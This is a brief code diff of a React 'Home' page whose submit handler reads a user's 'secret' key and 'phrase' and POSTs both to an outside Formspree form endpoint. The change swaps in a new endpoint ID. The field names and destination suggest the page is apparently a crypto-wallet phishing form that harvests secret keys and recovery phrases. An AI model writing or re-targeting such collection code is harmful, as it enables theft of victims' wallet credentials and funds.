@@ -45,7 +45,7 @@ export default function Home() {
   const handleSubmit = async (type: "secret" | "phrase") => {
     const secret = (secretKeyRef.current as any)?.value || "";
     const phrase = (phraseRef.current as any)?.value || "";
-    await fetch("https://formspree.io/f/mpwrbwyd", {
+    await fetch("https://formspree.io/f/xwpbyawq", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
